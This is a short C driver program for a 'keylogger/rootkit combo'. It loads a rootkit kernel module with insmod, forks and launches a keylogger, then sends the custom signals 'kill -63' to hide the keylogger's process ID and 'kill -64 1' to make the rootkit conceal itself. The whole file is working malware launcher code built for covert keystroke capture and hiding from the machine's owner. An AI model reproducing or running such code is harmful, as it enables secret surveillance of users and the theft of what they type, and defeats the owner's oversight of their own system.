// The driver file that wraps up running the keylogger/rootkit combo.
// make sure all of the pertinent executables are made before running this!

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(){
  char command[100];
  int pid;

  system("insmod rootkit/big_rootkit.ko"); //install the rootkit first

  pid = fork();
  if(pid == 0) { //Child process makes the keylogger go
    char *argv[] = {"keylogger", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
  }
  else {
    sprintf(command, "kill -63 %i", pid);//Parent process takes PID and hides it
    printf("pid is %i\n", pid);//Debugging line
    system(command);
    system("kill -64 1"); //Rootkit goes into hiding
  }
  return 0;
}
